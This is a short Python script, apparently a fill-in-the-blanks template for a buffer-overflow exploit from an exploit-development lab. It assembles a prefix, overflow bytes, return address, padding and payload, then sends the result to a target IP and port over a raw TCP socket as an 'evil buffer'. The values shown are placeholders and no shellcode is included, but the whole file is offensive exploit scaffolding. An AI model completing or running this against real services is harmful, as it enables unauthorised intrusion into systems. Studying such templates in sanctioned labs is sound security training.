#!/usr/bin/env python3
import socket

ip = "1.1.1.1" # Change to target

port = 1111 # Change to target

prefix = "OVRFLW " # Change
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "11111111" # Insert string from pattern_create
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
